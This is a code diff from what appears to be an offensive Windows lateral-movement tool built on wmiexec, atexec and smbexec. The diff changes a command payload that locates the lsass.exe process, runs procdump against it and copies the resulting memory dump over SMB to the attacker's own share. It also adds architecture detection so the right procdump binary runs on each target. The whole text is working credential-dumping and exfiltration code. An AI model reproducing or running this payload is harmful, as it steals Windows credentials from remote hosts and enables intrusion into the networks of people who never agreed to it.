@@ -12,13 +12,14 @@ import wmiexec, atexec, smbexec
 from core.Utils import *
 from core.SmbConnection import *
 from core.Colors import *
+from core.Arch import *
 
 
 def sprayLove(user, target, methods, local_ip, alea):
     if not methods : methods = ['wmiexec', 'atexec', 'smbexec']
     smb_share_name = gen_random_string(5)
-
-    payload = """for /f "tokens=1,2 delims= " ABCDA in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do net use \\\\%s\\%s /persistent:no /user:%s %s & \\\\%s\\%s\\procdump\\procdump64.exe -accepteula -ma EFGHB C:\\%s.dmp & move C:\\%s.dmp \\\\%s\\%s\\dumps\\%s.dmp & echo 'TOTHEMOON'""" % (local_ip, alea, alea, alea, local_ip, alea, alea, alea, local_ip, alea, target)
+    
+    payload = """for /f "tokens=1,2 delims= " ABCDA in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do net use \\\\%s\\%s /persistent:no /user:%s %s & \\\\%s\\%s\\procdump\\procdump%s.exe -accepteula -ma EFGHB C:\\%s.dmp & move C:\\%s.dmp \\\\%s\\%s\\dumps\\%s.dmp & echo 'TOTHEMOON'""" % (local_ip, alea, alea, alea, local_ip, alea, get_os_arch(target), alea, alea, local_ip, alea, target)
 
     exec_method = None
 
